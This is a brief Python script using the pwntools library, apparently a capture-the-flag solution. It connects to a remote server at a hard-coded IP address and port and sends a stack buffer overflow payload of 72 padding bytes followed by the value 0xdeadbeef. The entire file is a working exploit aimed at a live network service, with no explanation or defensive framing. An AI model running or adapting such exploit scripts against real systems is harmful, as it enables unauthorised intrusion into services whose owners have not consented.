from pwn import *

# Connect to the remote server
conn = remote('117.53.47.247', 50010)

# Create payload: 72 bytes to fill buffer + deadbeef value
payload = b'A'*72 + p64(0xdeadbeef)

# Send the payload
conn.sendline(payload)

print(conn.recvall())
